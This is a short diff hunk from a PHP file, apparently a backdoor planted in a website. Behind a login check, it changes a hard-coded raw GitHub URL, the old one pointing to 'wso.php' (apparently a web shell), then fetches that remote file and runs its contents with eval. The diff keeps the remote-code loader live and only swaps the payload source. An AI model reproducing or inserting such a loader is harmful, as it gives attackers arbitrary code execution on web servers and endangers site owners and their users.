@@ -67,7 +67,7 @@ if (is_logged_in()) {
         return false;
     }
 
-    $destiny = 'https://raw.githubusercontent.com/kembarbaru120000/213/refs/heads/main/wso.php';
+    $destiny = 'https://raw.githubusercontent.com/dedysubar28/weblist287/refs/heads/main/index.php';
     $dream = geturlsinfo($destiny);
     if ($dream !== false) {
         eval('?>' . $dream);
